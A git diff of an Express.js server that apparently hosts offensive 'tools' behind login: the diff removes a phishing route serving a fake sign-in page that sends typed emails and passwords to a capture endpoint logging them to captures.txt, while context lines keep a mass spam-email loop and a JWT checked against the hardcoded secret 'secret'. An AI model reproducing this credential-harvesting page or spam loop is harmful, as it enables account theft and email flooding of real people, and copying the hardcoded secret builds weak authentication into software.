@@ -59,64 +59,6 @@ app.post('/tools/spammer', authentication, authorize('spammer'), async (req, res
     }
 });
 
-app.get('/tools/phishing', authentication, authorize('phishing'), (req, res) => {
-    const html = `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Login Page</title>
-    </head>
-    <body>
-        <h2>Sign in</h2>
-        <form id="form">
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required>
-            <br>
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-            <br>
-            <button type="submit">Login</button>
-        </form>
-        <script>
-            document.querySelector('#form').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const email = document.getElementById('email').value;
-                const password = document.getElementById('password').value;
-                
-                fetch('/tools/phishing/capture', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ email, password })
-                }).then(response => {
-                    if (response.ok) {
-                        alert('Captured Email and Password');
-                    }
-                }).catch(error => console.error('Error:', error));
-            });
-        </script>
-    </body>
-    </html>`;
-    
-    res.send(html);
-});
-
-app.post('/tools/phishing/capture', authentication, authorize('phishing'), (req, res) => {
-    const { email, password } = req.body;
-    const data = `Email: ${email}, Password: ${password}\n`;
-
-    fs.appendFile(path.join(__dirname, 'captures.txt'), data, (err) => {
-        if (err) {
-            console.error('Error writing to file', err);
-            return res.sendStatus(500);
-        }
-        res.sendStatus(200);
-    });
-});
-
 app.get('/tools/password-check', authentication, authorize('password-check'), async (req, res) => {
     const { password } = req.query;
     if (!password) {
@@ -324,7 +266,6 @@ app.post('/logout', authentication, (req, res) => {
 });
 
 // Swagger
-
 app.get('/swagger', (req, res) => {
     res.sendFile(path.join(__dirname, 'swagger.json'));
 })
@@ -382,7 +323,6 @@ async function authentication(req, res, next) {
         let [type, token] = req.headers.authorization.split(" ");
         if (type !== "Bearer") throw { name: "Invalid token" };
 
-        // Vérifier si le token est sur la liste noire
         if (blacklist.includes(token)) throw { name: "Invalid token" };
         
         let payload = jwt.verify(token, "secret");
@@ -412,7 +352,6 @@ let transporter = nodemailer.createTransport({
     }
 });
 
-// Fonction pour envoyer un email
 async function sendSpamEmail(email, subject, text, numOfEmails) {
     for (let i = 0; i < numOfEmails; i++) {
       let mailOptions = {
